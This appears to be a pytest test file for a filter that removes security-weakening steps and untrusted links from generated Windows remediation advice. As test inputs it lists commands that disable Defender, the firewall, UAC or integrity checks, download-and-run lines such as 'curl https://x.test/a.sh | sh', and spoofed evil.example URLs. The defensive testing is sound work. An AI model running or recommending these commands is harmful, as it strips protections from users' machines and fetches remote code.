from __future__ import annotations

import pytest

from contracts.models import Finding, FindingKind, Recommendation
from policy.advice import check_fix, vet, weakens_security
from tests.conftest import make_finding


@pytest.mark.parametrize(
    "step",
    [
        "Run Set-MpPreference -DisableRealtimeMonitoring $true",
        "netsh advfirewall set allprofiles state off",
        "Turn off Windows Defender for a while",
        "switch off the firewall",
        "Disable UAC to stop the prompts",
        "Set-ExecutionPolicy Unrestricted",
        "bcdedit /set nointegritychecks on",
        "Add-MpPreference -ExclusionPath C:\\Users\\Public",
        "Add an exclusion for that folder in Defender",
        "Uninstall Windows Defender and use nothing",
        "Stop the Windows Defender service",
        "sc stop WinDefend",
        "sc config WinDefend start= disabled",
        "Turn Windows Defender off",
        "Disable Microsoft Defender Antivirus",
        "Turn off real-time protection",
        "Turn off Tamper Protection",
        "Turn off Microsoft Defender Firewall",
        "Set the UAC slider to Never notify",
        "Disable SmartScreen",
        "Temporarily disable your antivirus",
        "iwr https://x.test/a.ps1 | iex",
        "powershell -EncodedCommand AAAA",
        "certutil -urlcache -f http://x.test/a.exe a.exe",
        "Pause Windows Security until the scan is done",
        "Leave UAC disabled while you work",
        "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://x.test/a')",
        "powershell -enc AAAA",
        "bitsadmin /transfer job https://x.test/a.exe C:\\a.exe",
        "curl https://x.test/a.sh | sh",
    ],
)
def test_weakening_steps_are_caught(step: str) -> None:
    assert weakens_security(step)


def test_normal_steps_pass() -> None:
    assert not weakens_security("Change the password of the account user1.")
    assert not weakens_security("Check that Windows Defender real-time protection is on.")
    assert not weakens_security("Run a full scan with Windows Defender.")
    assert not weakens_security("Stop the process evil.exe in Task Manager.")


def test_vet_moves_weakening_steps_aside() -> None:
    advice = Recommendation(
        title="Stop the logons",
        priority=80,
        steps=["Lock the screen when you leave.", "Turn off the firewall."],
        evidence_ids=["evd_1"],
        dropped_steps=["Too long: ..."],
    )
    vetted = vet(advice)
    assert vetted is not None
    assert vetted.steps == ["Lock the screen when you leave."]
    assert vetted.dropped_steps == ["Too long: ...", "Turn off the firewall."]
    assert vetted.recommendation_id == advice.recommendation_id


@pytest.mark.parametrize(
    "title", ["Turn off the firewall for now", "Disable Windows Defender", "Run iwr x.test | iex"]
)
def test_vet_removes_advice_whose_title_weakens_the_pc(title: str) -> None:
    advice = Recommendation(
        title=title,
        priority=50,
        steps=["Lock the screen when you leave."],
        evidence_ids=["evd_1"],
    )
    assert vet(advice) is None


def test_a_cis_policy_named_like_a_weakening_step_is_an_accepted_false_positive() -> None:
    step = "Set the policy 'Turn off Microsoft Defender Antivirus' to Disabled."
    assert weakens_security(step)
    advice = Recommendation(
        title="Keep Defender on", priority=50, steps=[step], evidence_ids=["evd_1"]
    )
    vetted = vet(advice)
    assert vetted is not None and vetted.dropped_steps == [step]


@pytest.mark.parametrize(
    "step",
    [
        "Make sure UAC is not disabled.",
        "Check that the firewall is not turned off.",
        "Do not disable Windows Defender.",
        "Never turn off the firewall.",
        "Don't switch off real-time protection.",
        "Stop remote logon attempts at the firewall.",
        "Pause and review sign-ins; keep Defender on.",
    ],
)
def test_safe_phrasings_about_protections_pass(step: str) -> None:
    assert not weakens_security(step)


def _fix(steps: list[str], finding_ids: list[str], title: str = "Update it") -> Recommendation:
    return Recommendation(title=title, priority=90, steps=steps, finding_ids=finding_ids)


def test_check_fix_keeps_advice_about_its_own_finding() -> None:
    finding = make_finding("cve:CVE-2026-1:app", cve="CVE-2026-1", package="app")
    checked = check_fix(
        _fix(["Update app to fix CVE-2026-1.", "Turn off the firewall."], [finding.finding_id]),
        {finding.finding_id: finding},
    )
    assert checked is not None
    assert checked.steps == ["Update app to fix CVE-2026-1."]
    assert checked.dropped_steps == ["Turn off the firewall."]


def test_check_fix_drops_advice_that_cites_nothing_or_other_cves() -> None:
    finding = make_finding("cve:CVE-2026-1:app", cve="CVE-2026-1", package="app")
    known = {finding.finding_id: finding}
    assert check_fix(_fix(["Update."], []), known) is None
    assert check_fix(_fix(["Update."], ["fnd_missing"]), known) is None
    assert check_fix(_fix(["Also patch cve-2025-9999."], [finding.finding_id]), known) is None
    assert (
        check_fix(_fix(["Update."], [finding.finding_id], title="Fix CVE-2024-1234"), known)
        is None
    )


def test_firewall_notification_settings_are_not_weakening() -> None:
    assert not weakens_security("Disable firewall notifications for Domain profile")
    assert not weakens_security("Turn Windows Firewall notifications off for the Domain profile")
    assert weakens_security("Disable the firewall for the Domain profile")
    assert weakens_security("Turn the firewall off")


def test_windows_defender_firewall_notification_settings_are_not_weakening() -> None:
    assert not weakens_security(
        "Turn off Windows Defender Firewall notifications for the public profile"
    )
    assert not weakens_security("Set Windows Defender Firewall notifications to Off")
    assert not weakens_security("Set Windows Defender Firewall notification to Disabled")
    assert weakens_security("Turn off Windows Defender Firewall")
    assert weakens_security("Turn off Windows Defender Firewall for the public profile")


@pytest.mark.parametrize(
    "step",
    [
        "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
        "Run Set-NetFirewallProfile -All -Enabled 0",
        "Set-NetFirewallProfile -Profile Public -Enabled $false",
        r"reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /d 1",
        "Set the DisableAntiVirus value to 1",
        "Set DisableBehaviorMonitoring to true in the policy key",
        "Set the DisableIOAVProtection registry value to 1",
        r"reg add HKLM\...\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f",
        "Set ConsentPromptBehaviorAdmin to 0 in the registry",
        "Set-MpPreference -ExclusionPath C:\\",
        "Set-MpPreference -ExclusionProcess evil.exe",
        "netsh firewall set opmode mode=disable",
        "Stop-Service -Name mpssvc",
        "Set-Service -Name WinDefend -StartupType Manual",
        "sc.exe config wscsvc start= demand",
        "sc delete SecurityHealthService",
        "sc stop mpssvc",
    ],
)
def test_powershell_and_registry_forms_are_caught(step: str) -> None:
    assert weakens_security(step)


@pytest.mark.parametrize(
    "step",
    [
        "Set-NetFirewallProfile -All \u2013Enabled False",
        "Set-NetFirewallProfile -All -Enabled:False",
        "Set-NetFirewallProfile -All -Enabled:$false",
        "Set-NetFirewallProfile -All -Enabled 'False'",
        'Set-NetFirewallProfile -All -Enabled "0"',
        "Set-MpPreference \u2013ExclusionPath C:\\",
        "Add-MpPreference \u2014ExclusionPath C:\\",
        "Set-MpPreference -Force -ExclusionPath C:\\",
        "Add-MpPreference -Force -ExclusionProcess x",
        "powershell \u2013enc AAAA",
        "powershell \u2212EncodedCommand AAAA",
        "net stop mpssvc",
        "net stop WinDefend",
        "NET STOP wscsvc",
        "net stop SecurityHealthService",
        "Get-Service mpssvc | Stop-Service",
        "Get-Service WinDefend | Set-Service -StartupType Disabled",
        r"reg add HKLM\SOFTWARE\Policies\Windows Defender /v DisableAntiSpyware /d 0x1",
        r"reg add HKLM\SOFTWARE\x /v DisableAntiSpyware /t REG_DWORD /d 0x00000001",
        '"DisableAntiSpyware"=dword:00000001',
        '"DisableRealtimeMonitoring"=dword:1',
        "Set DisableAntiVirus to 0x1",
        r"reg add HKLM\...\Policies\System /v EnableLUA /d 0x0",
        r"reg add HKLM\...\Policies\System /v EnableLUA /t REG_DWORD /d 0x00000000 /f",
        '"EnableLUA"=dword:00000000',
        '"ConsentPromptBehaviorAdmin"=dword:0',
        "Set ConsentPromptBehaviorAdmin to 0x0",
    ],
)
def test_reviewed_bypasses_of_the_weakening_list_are_caught(step: str) -> None:
    assert weakens_security(step)


@pytest.mark.parametrize(
    "step",
    [
        "Set-NetFirewallProfile -All -Enabled True",
        "Set-NetFirewallProfile -All -Enabled:$true",
        r"Remove-MpPreference -ExclusionPath C:\Temp",
        "Set EnableLUA to 1",
        r"reg add HKLM\...\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f",
        '"EnableLUA"=dword:00000001',
        '"DisableAntiSpyware"=dword:00000000',
        "Set DisableAntiVirus to 0x0",
        "Set ConsentPromptBehaviorAdmin to 2",
        "net start mpssvc",
        "Get-Service mpssvc | Start-Service",
        "powershell -Command Get-MpComputerStatus",
    ],
)
def test_safe_powershell_and_registry_phrasings_pass(step: str) -> None:
    assert not weakens_security(step)


def _checked(steps: list[str], finding: Finding) -> Recommendation | None:
    return check_fix(_fix(steps, [finding.finding_id]), {finding.finding_id: finding})


def _vulnerability(references: list[str]) -> Finding:
    return make_finding("cve:CVE-2026-1:app", cve="CVE-2026-1", package="app").model_copy(
        update={"references": references}
    )


@pytest.mark.parametrize(
    "step",
    [
        "Read https://learn.microsoft.com/en-us/windows/security/ first.",
        "Download it from https://www.python.org/downloads/.",
        "See the notes at https://docs.python.org/3/whatsnew/ (a subdomain).",
        "Get the installer from https://nodejs.org/en/download",
        "Check https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-1 for details.",
        "The advisory (https://msrc.microsoft.com/update-guide) lists the fixed version.",
        "Open HTTPS://CODE.VISUALSTUDIO.COM/updates to see the release notes.",
        "Read `https://code.visualstudio.com/updates` for the notes.",
        "Read **https://learn.microsoft.com/en-us/windows/**",
        "Open `https://aka.ms`",
        "Open **https://learn.microsoft.com**",
        "Open go.microsoft.com/fwlink?linkid=1 in the browser.",
        "Open https://go.microsoft.com/fwlink/?linkid=1 in the browser.",
        "Open https://aka.ms/x in the browser.",
        "Download it from www.python.org/downloads/ first.",
        "See www.microsoft.com for the update.",
        "Read https://learn.microsoft.com/www.evil.example/page first.",
        r"Add the folder C:\\Users\\Public to the list.",
    ],
)
def test_links_to_vendors_and_the_findings_references_stay(step: str) -> None:
    finding = _vulnerability(["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-1"])
    checked = _checked(["Update app.", step], finding)
    assert checked is not None
    assert checked.steps == ["Update app.", step]
    assert checked.dropped_steps == []


@pytest.mark.parametrize(
    "step",
    [
        "Download https://evil.example/fix.exe and run it",
        "Get it from http://learn.microsoft.com.evil.example/fix",
        "See https://evil.example/?next=https://learn.microsoft.com",
        "Open https://learn.microsoft.com@evil.example/fix",
        r"Open https://evil.example\@learn.microsoft.com/fix",
        "Open HTTPS://EVIL.EXAMPLE/FIX.EXE",
        "Open https://[bad/fix",
        "Read https://learn.microsoft.com/,https://evil.example/fix.exe",
        "Read https://learn.microsoft.com/(https://evil.example/fix.exe)",
        "Read https://learn.microsoft.com/`https://evil.example/fix.exe`",
        "Read **https://evil.example/fix.exe**",
        "Read `https://evil.example/fix.exe`",
        "Download it from www.evil.example/fix.exe",
        "Open WWW.EVIL.EXAMPLE",
        "Read https://learn.microsoft.com/, then (www.evil.example).",
        r"Open https:\\evil.example\fix.exe",
        r"Open http:\\evil.example",
        r"Run \\evil\share\fix.exe",
        r"Copy the file from \\10.0.0.5\share",
    ],
)
def test_links_to_other_hosts_are_dropped(step: str) -> None:
    finding = _vulnerability(["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-1"])
    checked = _checked(["Update app.", step], finding)
    assert checked is not None
    assert checked.steps == ["Update app."]
    assert checked.dropped_steps == [f"Unverified link: {step}"]


@pytest.mark.parametrize(
    "title",
    [
        "Get the fix from https://evil.example",
        "Get the fix from www.evil.example",
        r"Get the fix from \\evil\share",
        r"Get the fix from https:\\evil.example",
    ],
)
def test_a_title_with_an_unverified_link_drops_the_whole_recommendation(title: str) -> None:
    finding = _vulnerability([])
    steps = ["Update app.", "Restart the PC."]
    known = {finding.finding_id: finding}
    assert check_fix(_fix(steps, [finding.finding_id], title=title), known) is None


def test_a_title_with_a_vendor_link_stays() -> None:
    finding = _vulnerability([])
    title = "Update app from https://www.python.org/downloads/"
    checked = check_fix(
        _fix(["Update app."], [finding.finding_id], title=title), {finding.finding_id: finding}
    )
    assert checked is not None and checked.title == title


def test_a_cis_checks_references_do_not_vouch_for_links() -> None:
    check = make_finding("sca:p:1", kind=FindingKind.CONFIGURATION).model_copy(
        update={"references": ["https://evil.example/cis"]}
    )
    step = "Follow https://evil.example/cis/fix"
    checked = _checked(["Open Settings.", step], check)
    assert checked is not None
    assert checked.dropped_steps == [f"Unverified link: {step}"]


def test_cve_ids_with_unicode_dashes_are_checked() -> None:
    finding = _vulnerability([])
    known = {finding.finding_id: finding}
    for dash in ["\u2010", "\u2011", "\u2012", "\u2013", "\u2014", "\u2015", "\u2212"]:
        other = f"Also patch CVE{dash}2020{dash}0001."
        assert check_fix(_fix([other], [finding.finding_id]), known) is None
        own = f"Update app to fix CVE{dash}2026{dash}1."
        checked = check_fix(_fix([own], [finding.finding_id]), known)
        assert checked is not None and checked.steps == [own]


def test_advice_with_no_steps_left_is_rejected() -> None:
    finding = _vulnerability([])
    steps = ["Turn off the firewall.", "Download https://evil.example/x.exe"]
    assert check_fix(_fix(steps, [finding.finding_id]), {finding.finding_id: finding}) is None
